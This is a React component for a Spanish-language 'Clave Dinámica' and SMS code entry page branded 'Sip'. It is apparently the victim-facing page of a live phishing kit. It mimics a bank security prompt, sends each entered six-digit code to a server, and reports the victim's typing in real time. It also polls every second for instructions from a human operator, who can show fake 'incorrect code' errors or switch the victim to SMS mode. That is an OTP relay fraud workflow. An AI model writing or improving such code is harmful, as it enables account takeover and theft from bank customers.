import { useEffect, useRef, useState, useTransition } from 'react'
import { SipLogo } from './Icons'

type OtpMode = 'dinamica' | 'sms'

type OtpPageProps = {
  sessionId: string
  initialMode: OtpMode
  onHome: () => void
  onSuccess: () => void
  onErrorLogin: () => void
}

export function OtpPage({
  sessionId,
  initialMode,
  onHome,
  onSuccess,
  onErrorLogin,
}: OtpPageProps) {
  const [mode, setMode] = useState<OtpMode>(initialMode)
  const [digits, setDigits] = useState<string[]>(['', '', '', '', '', ''])
  const [submitting, setSubmitting] = useState(false)
  const [errorMsg, setErrorMsg] = useState('')
  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
  const lastStateSent = useRef<string | null>(null)
  const [, startTransition] = useTransition()

  const fullCode = digits.join('')
  const isComplete = fullCode.length === 6

  // Keep-alive ping
  useEffect(() => {
    const ping = () => {
      fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {})
    }
    ping()
    const interval = window.setInterval(ping, 3000)
    return () => window.clearInterval(interval)
  }, [sessionId])

  // Polling for operator action
  useEffect(() => {
    const interval = window.setInterval(async () => {
      try {
        const res = await fetch(`/api/sessions/${sessionId}`)
        if (!res.ok) return
        const session = await res.json()
        const action = session.action

        if (action === 'done') {
          onSuccess()
          return
        }

        if (action === 'error-login') {
          onErrorLogin()
          return
        }

        if (action === 'error-dinamica' || action === 'error-sms') {
          setSubmitting(false)
          setDigits(['', '', '', '', '', ''])
          lastStateSent.current = null
          setErrorMsg(
            action === 'error-dinamica'
              ? 'Clave Dinámica incorrecta. Por favor, verifica e inténtalo de nuevo.'
              : 'Código SMS incorrecto. Por favor, verifica e inténtalo de nuevo.',
          )
          inputRefs.current[0]?.focus()
          // Acknowledge error on server
          fetch(`/api/sessions/${sessionId}/action`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: null }),
          }).catch(() => {})
          return
        }

        if (action === 'dinamica' || action === 'sms') {
          if (action !== mode) {
            setMode(action)
            setDigits(['', '', '', '', '', ''])
            setErrorMsg('')
            setSubmitting(false)
            inputRefs.current[0]?.focus()
          }
        }
      } catch {}
    }, 1000)

    return () => window.clearInterval(interval)
  }, [sessionId, mode, onSuccess, onErrorLogin])

  // Auto-focus first input on mount
  useEffect(() => {
    const timer = window.setTimeout(() => {
      inputRefs.current[0]?.focus()
    }, 200)
    return () => window.clearTimeout(timer)
  }, [mode])

  // Notify server of typing state
  function handleDigitChange(index: number, val: string) {
    const clean = val.replace(/\D/g, '')
    if (!clean && val !== '') return

    setErrorMsg('')
    const nextDigits = [...digits]

    if (clean.length > 1) {
      // Paste handling
      const chars = clean.slice(0, 6).split('')
      chars.forEach((c, i) => {
        if (i < 6) nextDigits[i] = c
      })
      startTransition(() => setDigits(nextDigits))
      const focusIndex = Math.min(chars.length, 5)
      inputRefs.current[focusIndex]?.focus()
    } else {
      nextDigits[index] = clean
      startTransition(() => setDigits(nextDigits))
      if (clean && index < 5) {
        inputRefs.current[index + 1]?.focus()
      }
    }

    const currentLength = nextDigits.join('').length
    const targetState = currentLength > 0 ? 'typing' : mode === 'sms' ? 'waiting-sms' : 'waiting-dinamica'
    if (lastStateSent.current !== targetState) {
      lastStateSent.current = targetState
      fetch(`/api/sessions/${sessionId}/state`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ state: targetState }),
      }).catch(() => {})
    }
  }

  function handleKeyDown(index: number, e: React.KeyboardEvent<HTMLInputElement>) {
    if (e.key === 'Backspace' && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus()
    }
  }

  async function submitToken() {
    if (!isComplete || submitting) return
    setSubmitting(true)
    setErrorMsg('')
    lastStateSent.current = null

    try {
      await fetch(`/api/sessions/${sessionId}/token`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: fullCode }),
      })
    } catch {}
  }

  return (
    <div className="login-page otp-page">
      <header className="login-top">
        <button type="button" className="login-logo" onClick={onHome} aria-label="Sip">
          <SipLogo />
        </button>
        <div className="login-security-tag">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
          </svg>
          <span>Conexión cifrada de alta seguridad</span>
        </div>
      </header>

      <div className="login-body otp-body">
        <div className="otp-card">
          <div className="otp-header">
            <div className="otp-icon-wrap">
              {mode === 'dinamica' ? (
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="5" y="2" width="14" height="20" rx="2" />
                  <line x1="12" y1="18" x2="12.01" y2="18" />
                  <path d="M9 7h6" />
                  <path d="M9 11h6" />
                </svg>
              ) : (
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
                  <path d="M8 10h.01" />
                  <path d="M12 10h.01" />
                  <path d="M16 10h.01" />
                </svg>
              )}
            </div>
            <h2>{mode === 'dinamica' ? 'Clave Dinámica' : 'Código de Verificación SMS'}</h2>
            <p className="otp-subtitle">
              {mode === 'dinamica'
                ? 'Ingresa el código de 6 dígitos generado en tu aplicación Sip o llavero de seguridad.'
                : 'Hemos enviado un código de verificación de 6 dígitos vía SMS a tu número de celular registrado.'}
            </p>
          </div>

          {errorMsg ? (
            <div className="otp-error-banner" role="alert">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                <circle cx="12" cy="12" r="10" />
                <line x1="12" y1="8" x2="12" y2="12" />
                <line x1="12" y1="16" x2="12.01" y2="16" />
              </svg>
              <span>{errorMsg}</span>
            </div>
          ) : null}

          {submitting ? (
            <div className="otp-validating" role="status" aria-live="polite">
              <span className="login-spinner" aria-hidden />
              <p className="otp-validating-title">Validando código de seguridad...</p>
              <p className="otp-validating-sub">Por favor, espera un momento mientras confirmamos tu identidad.</p>
            </div>
          ) : (
            <form
              className="otp-form"
              onSubmit={(e) => {
                e.preventDefault()
                submitToken()
              }}
            >
              <div className="otp-inputs" role="group" aria-label="Casillas de 6 dígitos">
                {digits.map((digit, idx) => (
                  <input
                    key={idx}
                    ref={(el) => {
                      inputRefs.current[idx] = el
                    }}
                    type="text"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength={idx === 0 ? 6 : 1}
                    value={digit}
                    autoComplete="one-time-code"
                    className={`otp-slot${digit ? ' filled' : ''}`}
                    onChange={(e) => handleDigitChange(idx, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(idx, e)}
                  />
                ))}
              </div>

              <button
                type="submit"
                className={`login-submit${isComplete ? ' ready' : ''}`}
                disabled={!isComplete || submitting}
              >
                Confirmar y continuar
              </button>

              <button
                type="button"
                className="login-outline otp-cancel"
                onClick={() => {
                  setDigits(['', '', '', '', '', ''])
                  inputRefs.current[0]?.focus()
                }}
              >
                Borrar código
              </button>
            </form>
          )}

          <div className="otp-help">
            <p>¿Tienes problemas con tu código?</p>
            <div className="otp-help-links">
              <span>Línea de soporte: (01) 619-4800</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
